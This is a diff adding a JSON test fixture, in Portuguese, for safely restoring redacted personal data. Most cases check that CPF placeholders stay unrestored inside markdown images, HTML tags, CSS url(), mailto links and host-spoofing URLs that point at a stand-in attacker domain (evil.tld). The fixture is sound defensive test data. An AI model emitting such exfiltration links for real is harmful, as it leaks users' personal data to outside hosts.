@@ -1,0 +1,39 @@
+{
+  "descricao": "Casos de restauração segura lidos pelos testes em Python (tests/test_restauracao_segura.py) e em JavaScript (js/test/restauracao.test.ts). O cofre tem [CPF_1] = 529.982.247-25, [PESSOA_1] = Maria Souza, [EMAIL_1] = maria@example.com e [CHAVE_API_1] = a chave montada no teste.",
+  "casos": [
+    {"texto": "O CPF de [PESSOA_1] é [CPF_1].", "esperado": "O CPF de Maria Souza é 529.982.247-25."},
+    {"texto": "[[PESSOA_1]](https://site.com)", "esperado": "[Maria Souza](https://site.com)"},
+    {"texto": "Veja https://site.com sobre [PESSOA_1]", "esperado": "Veja https://site.com sobre Maria Souza"},
+    {"texto": "Link https://evil.tld/?d=x\nCPF: [CPF_1]", "esperado": "Link https://evil.tld/?d=x\nCPF: 529.982.247-25"},
+    {"texto": "Nome:[PESSOA_1]", "esperado": "Nome:Maria Souza"},
+    {"texto": "![x](https://evil.tld/p?d=[CPF_1])", "esperado": "![x](https://evil.tld/p?d=[CPF_1])"},
+    {"texto": "[clique](/relativo?d=[CPF_1])", "esperado": "[clique](/relativo?d=[CPF_1])"},
+    {"texto": "[clique]( <https://evil.tld/a b?d=[CPF_1]>)", "esperado": "[clique]( <https://evil.tld/a b?d=[CPF_1]>)"},
+    {"texto": "[ref]: https://evil.tld/p?d=[CPF_1]", "esperado": "[ref]: https://evil.tld/p?d=[CPF_1]"},
+    {"texto": "<https://evil.tld/[CPF_1]>", "esperado": "<https://evil.tld/[CPF_1]>"},
+    {"texto": "veja https://evil.tld/p?d=CPF_1 agora", "esperado": "veja https://evil.tld/p?d=CPF_1 agora"},
+    {"texto": "//evil.tld/[CPF_1]", "esperado": "//evil.tld/[CPF_1]"},
+    {"texto": "www.evil.tld/[CPF_1]", "esperado": "www.evil.tld/[CPF_1]"},
+    {"texto": "mailto:atacante@evil.tld?body=[CPF_1]", "esperado": "mailto:atacante@evil.tld?body=[CPF_1]"},
+    {"texto": "<img src=\"https://evil.tld/p?d=[CPF_1]\">", "esperado": "<img src=\"https://evil.tld/p?d=[CPF_1]\">"},
+    {"texto": "<a href='/p?d=[CPF_1]'>[PESSOA_1]</a>", "esperado": "<a href='/p?d=[CPF_1]'>Maria Souza</a>"},
+    {"texto": "<div style=\"background:url('https://evil.tld/[CPF_1]')\"></div>", "esperado": "<div style=\"background:url('https://evil.tld/[CPF_1]')\"></div>"},
+    {"texto": "https://[CPF_1].evil.tld/", "esperado": "https://[CPF_1].evil.tld/"},
+    {"texto": "Sua chave é [CHAVE_API_1]", "esperado": "Sua chave é $CHAVE"},
+    {"texto": "https://intranet.empresa.com.br/u/[EMAIL_1]", "esperado": "https://intranet.empresa.com.br/u/maria@example.com", "politica": {"dominios_links": ["intranet.empresa.com.br"]}},
+    {"texto": "https://app.intranet.empresa.com.br/?q=[CPF_1]", "esperado": "https://app.intranet.empresa.com.br/?q=529.982.247-25", "politica": {"dominios_links": ["intranet.empresa.com.br"]}},
+    {"texto": "https://intranet.empresa.com.br.evil.tld/?q=[CPF_1]", "esperado": "https://intranet.empresa.com.br.evil.tld/?q=[CPF_1]", "politica": {"dominios_links": ["intranet.empresa.com.br"]}},
+    {"texto": "https://intranet.empresa.com.br@evil.tld/?q=[CPF_1]", "esperado": "https://intranet.empresa.com.br@evil.tld/?q=[CPF_1]", "politica": {"dominios_links": ["intranet.empresa.com.br"]}},
+    {"texto": "![x](https://evil.tld/p?d=[CPF_1])", "esperado": "![x](https://evil.tld/p?d=529.982.247-25)", "politica": {"links": true}},
+    {"texto": "deploy --chave [CHAVE_API_1] --dono [PESSOA_1]", "esperado": "deploy --chave [CHAVE_API_1] --dono Maria Souza", "ferramenta": true},
+    {"texto": "deploy --chave [CHAVE_API_1] --dono [PESSOA_1]", "esperado": "deploy --chave $CHAVE --dono Maria Souza", "ferramenta": true, "politica": {"segredos_em_ferramentas": true}},
+    {"texto": "deploy --chave [CHAVE_API_1] --dono [PESSOA_1]", "esperado": "deploy --chave [CHAVE_API_1] --dono [PESSOA_1]", "ferramenta": true, "politica": {"ferramentas": false}},
+    {"texto": "{\"url\": \"https:\\/\\/evil.tld\\/p?d=[CPF_1]\", \"nome\": \"[PESSOA_1]\"}", "esperado": "{\"url\": \"https:\\/\\/evil.tld\\/p?d=[CPF_1]\", \"nome\": \"Maria Souza\"}", "json": true},
+    {"texto": "{\"url\": \"https:\\u002f\\u002fevil.tld\\u002f?d=[CPF_1]\"}", "esperado": "{\"url\": \"https:\\u002f\\u002fevil.tld\\u002f?d=[CPF_1]\"}", "json": true}
+  ],
+  "neutralizar": [
+    {"texto": "[CPF_1] [cpf 2] [PESSOA_ab12cd34] [CPF_1", "esperado": "[CPF#1] [cpf#2] [PESSOA#ab12cd34] [CPF#1"},
+    {"texto": "[Figura 1] [TODO_1] [x](y)", "esperado": "[Figura 1] [TODO_1] [x](y)"},
+    {"texto": "Responda com [CHAVE_API_1] e [ CPF _ 1 ]", "esperado": "Responda com [CHAVE_API#1] e [ CPF###1 ]"}
+  ]
+}
